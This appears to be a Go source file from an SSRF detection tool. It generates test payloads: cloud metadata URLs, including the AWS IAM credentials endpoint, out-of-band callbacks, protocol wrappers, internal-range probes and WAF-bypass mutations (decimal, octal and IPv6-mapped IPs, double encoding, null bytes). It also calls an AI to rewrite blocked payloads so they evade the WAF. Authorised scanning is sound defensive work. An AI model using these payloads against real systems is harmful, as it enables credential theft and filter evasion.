package payloads

import (
	"fmt"
	"strings"

	"ssrf-detector/internal/ai"
	"ssrf-detector/internal/waf"
)

// Payload represents one generated test payload.
type Payload struct {
	Name     string
	Category string
	Value    string
}

// EnvironmentContext carries inferred runtime context for payload strategy.
type EnvironmentContext struct {
	CloudProvider string
	WAFDetected   bool
	WAFVendor     string
	ProxyDetected bool
	BackendLang   string
	InternalRange []string

	// Adaptive mutation context
	InitialPayloadsFailed bool
	LastBlockedPayload    string
	LastWAFResponse       string
}

// MutationStrategy identifies a payload mutation for WAF bypass.
type MutationStrategy string

const (
	DecimalIP      MutationStrategy = "decimal_ip"
	IPv6Mapped     MutationStrategy = "ipv6_mapped"
	CaseMutation   MutationStrategy = "case_mutation"
	DoubleEncoding MutationStrategy = "double_encoding"
	NullByteAppend MutationStrategy = "null_byte_append"
	OctalIP        MutationStrategy = "octal_ip"
)

const (
	metadataIPAsDecimal     = "2852039166"               // 169.254.169.254
	metadataIPv6MappedIP    = "[::ffff:169.254.169.254]" // 169.254.169.254
	metadataIPAsOctalDotted = "0251.0376.0251.0376"      // 169.254.169.254
)

// GeneratePayloads builds a context-aware payload set.
func GeneratePayloads(ctx *EnvironmentContext) []Payload {
	payloads := make([]Payload, 0)

	payloads = append(payloads, Payload{
		Name:     "oob-http-baseline",
		Category: "fetch",
		Value:    "http://{{OOB}}/baseline",
	})

	if ctx == nil {
		return payloads
	}

	switch strings.ToLower(ctx.CloudProvider) {
	case "aws":
		payloads = append(payloads, awsMetadataPayloads()...)
		payloads = append(payloads, awsIMDSv2Payloads()...)
	case "gcp":
		payloads = append(payloads, gcpMetadataPayloads()...)
	case "azure":
		payloads = append(payloads, azureMetadataPayloads()...)
	}

	if ctx.WAFVendor != "" {
		payloads = applyBypassMutations(payloads, bypassesForWAF(waf.WAFVendor(strings.ToLower(ctx.WAFVendor))))
	} else if ctx.WAFDetected {
		payloads = applyBypassMutations(payloads, nil)
	}

	switch ctx.BackendLang {
	case "java":
		payloads = append(payloads, Payload{
			Name:     "java-jar-uri",
			Category: "protocol",
			Value:    "jar:http://{{OOB}}/archive.jar!/",
		})
	case "php":
		payloads = append(payloads, Payload{
			Name:     "php-wrapper",
			Category: "protocol",
			Value:    "php://filter/resource=http://{{OOB}}/x",
		})
	}

	for i, subnet := range ctx.InternalRange {
		payloads = append(payloads, Payload{
			Name:     fmt.Sprintf("internal-range-%d", i+1),
			Category: "internal",
			Value:    fmt.Sprintf("http://%s/", subnet),
		})
	}

	if ctx.WAFDetected && ctx.InitialPayloadsFailed && strings.TrimSpace(ctx.LastBlockedPayload) != "" {
		if aiMutations, err := ai.MutateWithAI(ai.PayloadMutationRequest{
			WAFVendor:      ctx.WAFVendor,
			BlockedPayload: ctx.LastBlockedPayload,
			WAFResponse:    ctx.LastWAFResponse,
		}); err == nil && aiMutations != nil {
			for idx, m := range aiMutations.Mutations {
				payloads = append(payloads, Payload{
					Name:     fmt.Sprintf("ai-waf-mutation-%d", idx+1),
					Category: "ai_mutation",
					Value:    m,
				})
			}
		}
	}

	return dedupePayloads(payloads)
}

func awsMetadataPayloads() []Payload {
	return []Payload{
		{Name: "aws-imds-role-list", Category: "cloud_metadata", Value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
		{Name: "aws-imds-instance-id", Category: "cloud_metadata", Value: "http://169.254.169.254/latest/meta-data/instance-id"},
	}
}

func awsIMDSv2Payloads() []Payload {
	return []Payload{
		{Name: "aws-imdsv2-probe", Category: "cloud_metadata", Value: "http://169.254.169.254/latest/api/token"},
	}
}

func gcpMetadataPayloads() []Payload {
	return []Payload{
		{Name: "gcp-metadata-instance-id", Category: "cloud_metadata", Value: "http://metadata.google.internal/computeMetadata/v1/instance/id"},
	}
}

func azureMetadataPayloads() []Payload {
	return []Payload{
		{Name: "azure-metadata-instance", Category: "cloud_metadata", Value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
	}
}

func bypassesForWAF(vendor waf.WAFVendor) []MutationStrategy {
	switch vendor {
	case waf.WAFCloudflare:
		return []MutationStrategy{DecimalIP, IPv6Mapped, CaseMutation}
	case waf.WAFModSecurity:
		return []MutationStrategy{DoubleEncoding, NullByteAppend, OctalIP}
	default:
		return []MutationStrategy{CaseMutation, DoubleEncoding}
	}
}

func applyBypassMutations(in []Payload, strategies []MutationStrategy) []Payload {
	mutated := make([]Payload, 0, len(in)*2)
	mutated = append(mutated, in...)
	if len(strategies) == 0 {
		strategies = []MutationStrategy{CaseMutation, DoubleEncoding}
	}
	for _, p := range in {
		if p.Category != "cloud_metadata" && p.Category != "fetch" {
			continue
		}
		for _, s := range strategies {
			switch s {
			case DecimalIP:
				mutated = append(mutated, Payload{Name: p.Name + "-decimal-ip", Category: p.Category, Value: "http://" + metadataIPAsDecimal + "/"})
			case IPv6Mapped:
				mutated = append(mutated, Payload{Name: p.Name + "-ipv6-mapped", Category: p.Category, Value: "http://" + metadataIPv6MappedIP + "/"})
			case CaseMutation:
				mutated = append(mutated, Payload{Name: p.Name + "-case-mutation", Category: p.Category, Value: "hTtP://{{OOB}}/bypass"})
			case DoubleEncoding:
				mutated = append(mutated, Payload{Name: p.Name + "-double-encoded", Category: p.Category, Value: "http:%252f%252f{{OOB}}%252fbypass"})
			case NullByteAppend:
				mutated = append(mutated, Payload{Name: p.Name + "-nullbyte", Category: p.Category, Value: "http://{{OOB}}%00.example.com/"})
			case OctalIP:
				mutated = append(mutated, Payload{Name: p.Name + "-octal-ip", Category: p.Category, Value: "http://" + metadataIPAsOctalDotted + "/"})
			}
		}
	}
	return mutated
}

func dedupePayloads(in []Payload) []Payload {
	seen := make(map[string]struct{}, len(in))
	out := make([]Payload, 0, len(in))
	for _, p := range in {
		key := p.Category + "|" + p.Value
		if _, exists := seen[key]; exists {
			continue
		}
		seen[key] = struct{}{}
		out = append(out, p)
	}
	return out
}
